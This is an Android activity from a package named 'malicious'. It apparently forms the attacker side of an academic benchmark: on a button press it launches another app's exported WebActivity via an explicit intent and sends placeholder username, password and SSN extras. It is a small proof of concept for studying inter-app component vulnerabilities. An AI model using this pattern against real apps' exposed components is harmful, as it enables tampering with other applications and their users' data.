package edu.ksu.cs.malicious;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(
                        new Intent()
                                .putExtra("username", "Whoami")
                                .putExtra("password", "idontknow")
                                .putExtra("ssn", "420")
                                .setComponent(new ComponentName("edu.ksu.cs.benign", "edu.ksu.cs.benign.WebActivity"))
                );
            }
        });
    }
}